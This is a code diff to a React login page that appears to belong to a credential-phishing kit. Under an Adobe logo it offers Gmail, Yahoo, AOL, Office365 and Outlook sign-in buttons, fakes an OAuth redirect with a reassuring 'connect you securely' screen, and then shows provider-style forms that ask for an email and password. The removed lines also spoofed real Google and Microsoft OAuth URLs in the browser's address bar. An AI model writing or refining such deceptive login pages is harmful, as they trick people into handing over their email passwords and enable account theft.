@@ -27,6 +27,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [isRedirecting, setIsRedirecting] = useState(false);
   
   const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
     onLoginSuccess,
@@ -46,20 +47,22 @@ const LoginPage: React.FC<LoginPageProps> = ({
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const provider = urlParams.get('provider');
-    const authReturn = urlParams.get('auth_return');
+    const authCode = urlParams.get('code');
     
-    // If returning from simulated OAuth, show the provider's login form
-    if (authReturn && provider) {
+    // If returning from simulated OAuth
+    if (authCode && provider) {
       handleProviderReturn(provider);
     }
   }, []);
 
   const handleProviderReturn = (providerName: string) => {
-    // Clean up the URL without reloading
-    const cleanUrl = window.location.pathname;
-    window.history.replaceState({}, document.title, cleanUrl);
+    // Clean up the URL
+    const baseUrl = window.location.pathname;
+    window.history.replaceState({}, document.title, baseUrl);
     
     // Trigger the appropriate provider login page
+    setIsRedirecting(false);
+    
     if (providerName.toLowerCase() === 'gmail' && onGmailSelect) {
       onGmailSelect();
     } else if (providerName.toLowerCase() === 'yahoo' && onYahooSelect) {
@@ -74,60 +77,39 @@ const LoginPage: React.FC<LoginPageProps> = ({
   };
 
   const simulateOAuthRedirect = (providerName: string) => {
+    // Show redirecting state
+    setIsRedirecting(true);
+    
     // Generate OAuth-like parameters
-    const clientId = `client_${Math.random().toString(36).substr(2, 9)}`;
     const state = Math.random().toString(36).substr(2, 15);
-    const nonce = Math.random().toString(36).substr(2, 20);
-    const sessionId = `session_${Date.now()}`;
+    const code = `auth_${Math.random().toString(36).substr(2, 20)}`;
     
-    // Map providers to their OAuth-style URLs
-    const providerUrls: { [key: string]: string } = {
-      'Gmail': `https://accounts.google.com/oauth/authorize`,
-      'Yahoo': `https://api.login.yahoo.com/oauth2/request_auth`,
-      'AOL': `https://api.login.aol.com/oauth2/request_auth`,
-      'Office365': `https://login.microsoftonline.com/common/oauth2/v2.0/authorize`,
-      'Outlook': `https://login.microsoftonline.com/common/oauth2/v2.0/authorize`,
-      'Others': `https://auth.provider.com/oauth/authorize`
-    };
-
-    const baseAuthUrl = providerUrls[providerName] || providerUrls['Others'];
-    const currentUrl = window.location.origin + window.location.pathname;
-    
-    // Build OAuth-style URL parameters
-    const authParams = new URLSearchParams({
-      client_id: clientId,
-      redirect_uri: currentUrl,
-      response_type: 'code',
-      scope: providerName === 'Gmail' ? 'email profile https://mail.google.com/' : 'email profile',
+    // First, update URL to show OAuth process is starting
+    const authStartParams = new URLSearchParams({
+      oauth_provider: providerName.toLowerCase(),
       state: state,
-      nonce: nonce,
-      access_type: 'offline',
-      prompt: 'consent'
+      redirect_initiated: 'true'
     });
-
-    // Create the full OAuth URL
-    const oauthUrl = `${baseAuthUrl}?${authParams.toString()}`;
     
-    // Update the browser URL to show OAuth redirect
-    window.history.pushState({}, '', oauthUrl);
+    const currentPath = window.location.pathname;
+    window.history.pushState({}, '', `${currentPath}?${authStartParams.toString()}`);
     
-    // Simulate redirect delay, then return to your app
+    // Simulate OAuth redirect delay
     setTimeout(() => {
       // Simulate returning from OAuth with auth code
       const returnParams = new URLSearchParams({
-        code: `auth_code_${Math.random().toString(36).substr(2, 20)}`,
+        code: code,
         state: state,
-        session_state: sessionId,
         provider: providerName,
-        auth_return: 'true'
+        scope: 'email profile',
+        auth_time: Date.now().toString()
       });
       
-      const returnUrl = `${currentUrl}?${returnParams.toString()}`;
-      window.history.replaceState({}, '', returnUrl);
+      window.history.replaceState({}, '', `${currentPath}?${returnParams.toString()}`);
       
       // Trigger the provider's login page
       handleProviderReturn(providerName);
-    }, 1500); // 1.5 second delay to simulate redirect
+    }, 1500); // 1.5 second delay
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -142,10 +124,10 @@ const LoginPage: React.FC<LoginPageProps> = ({
     setEmail('');
     setPassword('');
     resetLoginState();
+    setIsRedirecting(false);
   };
 
   const handleProviderClick = (providerName: string) => {
-    // Show loading or redirecting state
     simulateOAuthRedirect(providerName);
   };
 
@@ -156,6 +138,27 @@ const LoginPage: React.FC<LoginPageProps> = ({
       className="w-10 h-10 drop-shadow-lg"
     />
   );
+
+  // Show redirecting screen
+  if (isRedirecting) {
+    return (
+      <div 
+        className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
+        style={{
+          backgroundImage: "url('https://images.unsplash.com/photo-1588345921523-c2dcdb7f1dcd?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=2070&q=80')"
+        }}
+      >
+        <div className="bg-white/90 backdrop-blur-md rounded-2xl p-8 shadow-2xl text-center">
+          <AdobeLogo />
+          <h2 className="text-xl font-semibold text-gray-800 mt-4">Redirecting to authentication provider...</h2>
+          <div className="mt-6">
+            <Spinner size="md" color="border-blue-600" />
+          </div>
+          <p className="text-sm text-gray-600 mt-4">Please wait while we connect you securely</p>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div 
